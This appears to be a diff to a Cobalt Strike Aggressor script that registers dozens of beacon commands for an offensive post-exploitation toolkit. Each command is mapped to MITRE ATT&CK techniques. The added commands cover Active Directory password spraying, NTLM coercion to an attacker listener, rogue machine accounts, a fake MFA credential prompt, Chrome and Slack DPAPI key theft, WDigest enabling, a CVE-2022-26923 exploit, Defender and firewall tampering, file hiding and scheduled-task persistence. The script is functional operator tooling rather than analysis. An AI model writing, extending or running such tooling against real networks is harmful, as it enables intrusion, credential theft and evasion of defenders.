+    "Synopsis: enum-active-hosts <subnet-prefix>\n\nDescription: Sweep a /24 subnet using icmp.dll IcmpSendEcho.\n\nMITRE ATT&CK: T1018\n\nArgs: <x.x.x> subnet prefix (e.g. 192.168.1)"
+);
+
+# --- enum-dll-sideloading ---
+alias enum-dll-sideloading {
+    dani_run($1, "enum-dll-sideloading", "");
+}
+beacon_command_register(
+    "enum-dll-sideloading",
+    "Enumerate non-system-dir loaded DLLs — T1574.002 (by Dani)",
+    "Synopsis: enum-dll-sideloading\n\nDescription: List loaded DLLs outside system directories as sideloading candidates.\n\nMITRE ATT&CK: T1574.002\n\nArgs: none"
+);
+
+# --- enum-drives ---
+alias enum-drives {
+    dani_run($1, "enum-drives", "");
+}
+beacon_command_register(
+    "enum-drives",
+    "Enumerate logical drives — T1083 (by Dani)",
+    "Synopsis: enum-drives\n\nDescription: List all logical drives with type, free space, and total size.\n\nMITRE ATT&CK: T1083\n\nArgs: none"
+);
+
+# --- enum-exclusions ---
+alias enum-exclusions {
+    dani_run($1, "enum-exclusions", "");
+}
+beacon_command_register(
+    "enum-exclusions",
+    "Enumerate Defender exclusions — T1562.001 (by Dani)",
+    "Synopsis: enum-exclusions\n\nDescription: List all Defender path, extension, and process exclusions from the registry.\n\nMITRE ATT&CK: T1562.001\n\nArgs: none"
+);
+
+# --- enum-files ---
+alias enum-files {
+    local('$bid $path $args');
+    $bid = $1; $path = $2;
+    if ($path is $null) { $path = "."; }
+    $args = bof_pack($bid, "z", $path);
+    dani_run($bid, "enum-files", $args);
+}
+beacon_command_register(
+    "enum-files",
+    "BFS file enumeration — T1083 (by Dani)",
+    "Synopsis: enum-files [path]\n\nDescription: Enumerate files from a path BFS up to depth 5, max 200 entries.\n\nMITRE ATT&CK: T1083\n\nArgs: [path] (default: .)"
+);
+
+# --- enum-handles ---
+alias enum-handles {
+    dani_run($1, "enum-handles", "");
+}
+beacon_command_register(
+    "enum-handles",
+    "System-wide handle enumeration — T1106 (by Dani)",
+    "Synopsis: enum-handles\n\nDescription: x64-only. Enumerate all system handles via NtQuerySystemInformation(SystemHandleInformation).\n\nMITRE ATT&CK: T1106\n\nArgs: none"
+);
+
+# --- enum-lib ---
+alias enum-lib {
+    dani_run($1, "enum-lib", "");
+}
+beacon_command_register(
+    "enum-lib",
+    "Process module list — T1057 (by Dani)",
+    "Synopsis: enum-lib\n\nDescription: Enumerate loaded modules for the current process via Module32First/Next.\n\nMITRE ATT&CK: T1057\n\nArgs: none"
+);
+
+# --- dll-env-hijacking ---
+alias dll-env-hijacking {
+    dani_run($1, "dll-env-hijacking", "");
+}
+beacon_command_register(
+    "dll-env-hijacking",
+    "Check writable PATH dirs for DLL hijacking — T1574.007 (by Dani)",
+    "Synopsis: dll-env-hijacking\n\nDescription: Probe each PATH directory for write access as a DLL planting candidate.\n\nMITRE ATT&CK: T1574.007\n\nArgs: none"
+);
+
+# --- enum-task-scheduler ---
+alias enum-task-scheduler {
+    dani_run($1, "enum-task-scheduler", "");
+}
+beacon_command_register(
+    "enum-task-scheduler",
+    "Enumerate scheduled tasks via COM — T1053.005 (by Dani)",
+    "Synopsis: enum-task-scheduler\n\nDescription: List scheduled tasks with name, path, and enabled state via ITaskService COM vtable.\n\nMITRE ATT&CK: T1053.005\n\nArgs: none"
+);
+
+# --- enum-shares ---
+alias enum-shares {
+    local('$bid $server $args');
+    $bid = $1; $server = $2;
+    if ($server is $null) { $server = ""; }
+    $args = bof_pack($bid, "z", $server);
+    dani_run($bid, "enum-shares", $args);
+}
+beacon_command_register(
+    "enum-shares",
+    "Enumerate network shares — T1135 (by Dani)",
+    "Synopsis: enum-shares [\\\\server]\n\nDescription: List shares via NetShareEnum level 1. Defaults to localhost.\n\nMITRE ATT&CK: T1135\n\nArgs: [\\\\server] (optional)"
+);
+
+# --- force-lock-screen ---
+alias force-lock-screen {
+    dani_run($1, "force-lock-screen", "");
+}
+beacon_command_register(
+    "force-lock-screen",
+    "Force workstation lock — T1531 (by Dani)",
+    "Synopsis: force-lock-screen\n\nDescription: Lock the workstation via LockWorkStation.\n\nMITRE ATT&CK: T1531\n\nArgs: none"
+);
+
+# --- enum-web-client ---
+alias enum-web-client {
+    dani_run($1, "enum-web-client", "");
+}
+beacon_command_register(
+    "enum-web-client",
+    "Check WebClient service and proxy — T1135 (by Dani)",
+    "Synopsis: enum-web-client\n\nDescription: Check WebClient service status and WinHTTP proxy configuration.\n\nMITRE ATT&CK: T1135\n\nArgs: none"
+);
+
+# ============================================================
+# PHASE 5 GAP-FILL — C2-Collection (5 new BOFs)
+# ============================================================
+
+# --- add-machine-account ---
+alias add-machine-account {
+    local('$bid $name $pass $args');
+    $bid = $1; $name = $2; $pass = $3;
+    if ($name is $null || $pass is $null) { berror($bid, "Use: add-machine-account <name> <password>"); return; }
+    $args = bof_pack($bid, "zz", $name, $pass);
+    dani_run($bid, "add-machine-account", $args);
+}
+beacon_command_register(
+    "add-machine-account",
+    "Add AD machine account — T1136.002 (by Dani)",
+    "Synopsis: add-machine-account <name> <password>\n\nDescription: Create an AD machine account via NetUserAdd with WORKSTATION_TRUST_ACCOUNT.\n\nMITRE ATT&CK: T1136.002\n\nArgs: <name> <password>"
+);
+
+# --- petit-potam ---
+alias petit-potam {
+    local('$bid $listener $share $args');
+    $bid = $1; $listener = $2; $share = $3;
+    if ($listener is $null) { berror($bid, "Use: petit-potam <listener-ip> [share]"); return; }
+    if ($share is $null) { $share = "test"; }
+    $args = bof_pack($bid, "zz", $listener, $share);
+    dani_run($bid, "petit-potam", $args);
+}
+beacon_command_register(
+    "petit-potam",
+    "SMB NTLM coercion via UNC path — T1187 (by Dani)",
+    "Synopsis: petit-potam <listener-ip> [share]\n\nDescription: Trigger NTLM authentication coercion by opening a UNC path to attacker-controlled listener.\n\nMITRE ATT&CK: T1187\n\nArgs: <listener-ip> [share]"
+);
+
+# --- spray-ad ---
+alias spray-ad {
+    local('$bid $users $pass $args');
+    $bid = $1; $users = $2; $pass = $3;
+    if ($users is $null || $pass is $null) { berror($bid, "Use: spray-ad <user1,user2,...> <password>"); return; }
+    $args = bof_pack($bid, "zz", $users, $pass);
+    dani_run($bid, "spray-ad", $args);
+}
+beacon_command_register(
+    "spray-ad",
+    "AD password spray with auto domain — T1110.003 (by Dani)",
+    "Synopsis: spray-ad <user1,user2,...> <password>\n\nDescription: Spray a password against AD accounts; auto-discovers domain via GetComputerNameExA.\n\nMITRE ATT&CK: T1110.003\n\nArgs: <comma-users> <password>"
+);
+
+# --- start-web-client ---
+alias start-web-client {
+    dani_run($1, "start-web-client", "");
+}
+beacon_command_register(
+    "start-web-client",
+    "Start WebClient service — T1021.002 (by Dani)",
+    "Synopsis: start-web-client\n\nDescription: Start the WebDAV WebClient service via SCM if not already running.\n\nMITRE ATT&CK: T1021.002\n\nArgs: none"
+);
+
+# --- winver ---
+alias winver {
+    dani_run($1, "winver", "");
+}
+beacon_command_register(
+    "winver",
+    "Full OS/hardware info — T1082 (by Dani)",
+    "Synopsis: winver\n\nDescription: Report OS version (RtlGetVersion), arch, username, and hostname.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
+);
+
 # ============================================================
 # ============================================================
 # META-COMMAND: dani-help
@@ -1888,7 +2811,7 @@ alias dani-help {
     $bid = $1;
     blog($bid, "=================================================================");
     blog($bid, "  DEF-Situational-Awareness-BOF  //  by Dani");
-    blog($bid, "  81 BOFs across 6 phases  |  Use 'help <cmd>' for full syntax");
+    blog($bid, "  157 BOFs across 6 phases  |  Use 'help <cmd>' for full syntax");
     blog($bid, "=================================================================");
     blog($bid, "");
     blog($bid, "PHASE 1 — Canary (3 BOFs, no args)");
@@ -1972,7 +2895,7 @@ alias dani-help {
     blog($bid, "  capture-netntlm T1187    NetNTLMv2 capture        <unc-path>");
     blog($bid, "  authenticate-http T1187  Outbound NTLM HTTP auth  <url>");
     blog($bid, "");
-    blog($bid, "PHASE 4 — C2-Collection (8 BOFs)");
+    blog($bid, "PHASE 4 — C2-Collection (13 BOFs)");
     blog($bid, "  psx            T1057/34  Process+token+secprods (indirect sc)");
     blog($bid, "  psk            T1518.001 Kernel drivers + sec products");
     blog($bid, "  psm            T1057     Process modules via PEB walk");
@@ -1981,6 +2904,87 @@ alias dani-help {
     blog($bid, "  lapsdump       T1555     LAPS passwords from AD");
     blog($bid, "  wdtoggle       T1003.001 Enable WDigest caching");
     blog($bid, "  cve-2022-26923 T1068     AD CS dNSHostName spoof  <machinacct> <pass>");
+    blog($bid, "  add-machine-account T1136.002 Add AD machine account <name> <pass>");
+    blog($bid, "  petit-potam    T1187     SMB NTLM coercion        <listener> [share]");
+    blog($bid, "  spray-ad       T1110.003 AD spray (auto-domain)   <users,> <pass>");
+    blog($bid, "  start-web-client T1021.002 Start WebClient svc    [no args]");
+    blog($bid, "  winver         T1082     Full OS/arch/user info   [no args]");
+    blog($bid, "");
+    blog($bid, "PHASE 2 Gap-fill — SA (21 BOFs)");
+    blog($bid, "  adcs-enum      T1518.001 ADCS CA via registry     [no args]");
+    blog($bid, "  adv-audit-policies T1082 Audit policies          [no args]");
+    blog($bid, "  enum-local-sessions T1033 Active logon sessions  [no args]");
+    blog($bid, "  get-session-info T1033   RDP/console sessions     [no args]");
+    blog($bid, "  listdns        T1016     DNS cache                [no args]");
+    blog($bid, "  locale         T1082     Locale/timezone          [no args]");
+    blog($bid, "  md5            T1082     MD5 hash file            <path>");
+    blog($bid, "  sha1           T1082     SHA1 hash file           <path>");
+    blog($bid, "  sha256         T1082     SHA256 hash file         <path>");
+    blog($bid, "  nettime        T1124     Domain time source       [no args]");
+    blog($bid, "  netuptime      T1082     System uptime            [no args]");
+    blog($bid, "  netuse         T1135     Mapped drives            [no args]");
+    blog($bid, "  netview        T1018     Network computers        [no args]");
+    blog($bid, "  regsession     T1082     Registry session data    [no args]");
+    blog($bid, "  resources      T1082     CPU/mem/disk             [no args]");
+    blog($bid, "  sc-enum        T1007     All services             [no args]");
+    blog($bid, "  sc-qc          T1007     Service config           <name>");
+    blog($bid, "  sc-qdescription T1007    Service description      <name>");
+    blog($bid, "  sc-qfailure    T1007     Service failure actions  <name>");
+    blog($bid, "  sc-qtriggerinfo T1007    Service trigger info     <name>");
+    blog($bid, "  vssenum        T1003.003 VSS shadow copies        [no args]");
+    blog($bid, "");
+    blog($bid, "PHASE 3 Gap-fill — Remote-Ops (26 BOFs)");
+    blog($bid, "  processdestroy T1562.001 Kill process by PID/name <pid-or-name>");
+    blog($bid, "  processlisthandles T1106 System-wide handles x64  [no args]");
+    blog($bid, "  reg-delete     T1112     Delete reg value/key     <hive> <key> [val]");
+    blog($bid, "  reg-set        T1112     Set reg value            <hive> <key> <val> <type> <data>");
+    blog($bid, "  sc-config      T1543.003 Change svc start type    <name> <type> [binpath]");
+    blog($bid, "  sc-description T1543.003 Set svc description      <name> <desc>");
+    blog($bid, "  sc-failure     T1543.003 Set svc failure actions  <name>");
+    blog($bid, "  sc-start       T1569.002 Start service            <name>");
+    blog($bid, "  sc-stop        T1489     Stop service             <name>");
+    blog($bid, "  shutdown       T1529     Shutdown/reboot/logoff   [s|r|l|f]");
+    blog($bid, "  conhost        T1057     Conhost.exe PIDs         [no args]");
+    blog($bid, "  svcctrl        T1489     Svc start/stop ctrl      <action> <name>");
+    blog($bid, "  ctray          T1082     System tray windows      [no args]");
+    blog($bid, "  dde            T1559.002 Office DDE registry      [no args]");
+    blog($bid, "  tooltip        T1010     Tooltip windows          [no args]");
+    blog($bid, "  uxsubclassinfo T1055     Window hook detection    [no args]");
+    blog($bid, "  setthreadcontext T1055.003 Thread RIP enum x64   <pid>");
+    blog($bid, "  slack-cookie   T1539     Slack AppData enum       [no args]");
+    blog($bid, "  slackkey       T1539     Slack DPAPI key          [no args]");
+    blog($bid, "  chromekey      T1555.003 Chrome DPAPI key         [no args]");
+    blog($bid, "  office-tokens  T1528     Office token cache paths [no args]");
+    blog($bid, "  lastpass       T1555.003 LastPass storage paths   [no args]");
+    blog($bid, "  get-azure-token T1528    Azure/MSAL token paths   [no args]");
+    blog($bid, "  ask-mfa        T1056.002 Fake MFA credential dlg  [caption] [msg]");
+    blog($bid, "  adcs-request   T1649     ADCS CA from registry    [no args]");
+    blog($bid, "  adcs-request-on-behalf T1649 ESC3 feasibility    [no args]");
+    blog($bid, "");
+    blog($bid, "PHASE 4 Gap-fill — OperatorsKit (23 BOFs)");
+    blog($bid, "  add-firewall-rule T1562.004 Add FW rule via reg  <name> <in|out> <proto> <port>");
+    blog($bid, "  del-firewall-rule T1562.004 Del FW rule          <name>");
+    blog($bid, "  add-local-cert T1553.004  Import cert to store    <store> <path>");
+    blog($bid, "  del-local-cert T1553.004  Del cert by thumbprint  <store> <sha1>");
+    blog($bid, "  enum-local-cert T1552.004 List cert stores        [no args]");
+    blog($bid, "  add-task-scheduler T1053.005 Add sched task COM  <name> <cmd> [trig]");
+    blog($bid, "  del-task-scheduler T1053.005 Del sched task COM  <name>");
+    blog($bid, "  del-exclusion  T1562.001  Del Defender exclusion  <type> <value>");
+    blog($bid, "  hide-file      T1564.001  Hide+system file attrs  <path>");
+    blog($bid, "  password-spray-ad T1110.003 AD spray             <users,> <pass>");
+    blog($bid, "  password-spray-local T1110.003 Local spray       <users,> <pass>");
+    blog($bid, "  enum-active-hosts T1018   ICMP ping sweep /24     <x.x.x>");
+    blog($bid, "  enum-dll-sideloading T1574.002 Non-sys DLLs     [no args]");
+    blog($bid, "  enum-drives    T1083     Logical drives           [no args]");
+    blog($bid, "  enum-exclusions T1562.001 Defender exclusions     [no args]");
+    blog($bid, "  enum-files     T1083     BFS file enum depth 5    [path]");
+    blog($bid, "  enum-handles   T1106     System handles x64       [no args]");
+    blog($bid, "  enum-lib       T1057     Process module list      [no args]");
+    blog($bid, "  dll-env-hijacking T1574.007 Writable PATH dirs   [no args]");
+    blog($bid, "  enum-task-scheduler T1053.005 Sched tasks COM    [no args]");
+    blog($bid, "  enum-shares    T1135     Network shares           [\\\\server]");
+    blog($bid, "  force-lock-screen T1531  Lock workstation         [no args]");
+    blog($bid, "  enum-web-client T1135    WebClient + proxy        [no args]");
     blog($bid, "");
     blog($bid, "PHASE 5 — Persistence (2 BOFs, by Dani)");
     blog($bid, "  schtask-com    T1053.005 Sched task via COM       <name> <cmd> [trig] [rm]");
@@ -1994,9 +2998,9 @@ alias dani-help {
 }
 beacon_command_register(
     "dani-help",
-    "List all 81 BOFs in the Dani suite by phase and technique",
+    "List all 157 BOFs in the Dani suite by phase and technique",
     "Synopsis: dani-help\n\n" .
-    "Description: Print a structured list of all 81 BOFs available in the\n" .
+    "Description: Print a structured list of all 157 BOFs available in the\n" .
     "DEF-Situational-Awareness-BOF suite, organized by phase, with MITRE\n" .
     "ATT&CK technique IDs and argument summaries.\n\n" .
     "Use 'help <command>' for full syntax and MITRE details on any BOF.\n\n" .
